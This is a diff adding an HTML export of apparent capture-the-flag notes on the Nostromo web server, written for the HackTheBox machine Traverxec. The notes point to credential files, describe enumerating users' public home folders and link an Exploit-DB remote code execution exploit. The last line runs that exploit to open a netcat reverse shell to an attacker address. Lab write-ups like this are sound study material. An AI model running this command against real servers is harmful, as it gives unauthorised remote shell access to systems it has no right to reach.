@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Nostromo</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Nostromo</h1></strong><br /><a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd">https://www.gsp.com/cgi-bin/man.cgi?section=8&amp;topic=nhttpd</a><br /><br />Nostromo is an open-source web server designed by Marcus Glocker. <br />It runs as a single process, and handles normal concurrent connections by select calls. <br />It&#39;s written in C.<br /><br /><strong>Examples</strong><br />• htb Traverxec<br /><br /><strong><h2>## Config files</h2></strong><br />• <code>/var/nostromo/conf</code><br />   ◇ <code>/var/nostromo/conf/.htpasswd</code> - probably contains credentials<br /><br /><strong><h2>## HOMEDIRS</h2></strong><br />The Nostromo man page describes what HOMEDIRS are - <a href="http://www.nazgul.ch/dev/nostromo_man.html">http://www.nazgul.ch/dev/nostromo_man.html</a><br /><br />The <code>homedirs</code> option lets you serve the home directories of users via HTTP.<br />The URL of the user&#39;s home directory is - <code>http://example.com/~user/</code><br /><br />The <code>homedirs_public</code> specifies specific sub-directories in a users&#39; home folder to be included (instead of the entire home folder). An example directory might be <code>public_www</code><br /><br />In <code>/home</code> is david, which we can&#39;t read.<br />Have a look in david&#39;s <code>/home/david/public_www</code> folder -&gt; you might be able to read it.<br />Folders you find in here you can then browse to on the website:<br /><code>http://10.10.10.165/~david/protected-file-area</code><br /><br /><strong><h2>## Exploits<br /></h2></strong><strong><h3>### Nostromo 1.9.6 - RCE</h3></strong><br /><a href="https://www.exploit-db.com/exploits/47837">https://www.exploit-db.com/exploits/47837</a><br /><br /><strong>Examples</strong><br />• htb Traverxec<br /><br /><code>python nostromo.py 10.10.10.165 80 &quot;nc 10.10.14.12 443 -e /bin/bash&quot;</code></div>
+</body>
+</html>
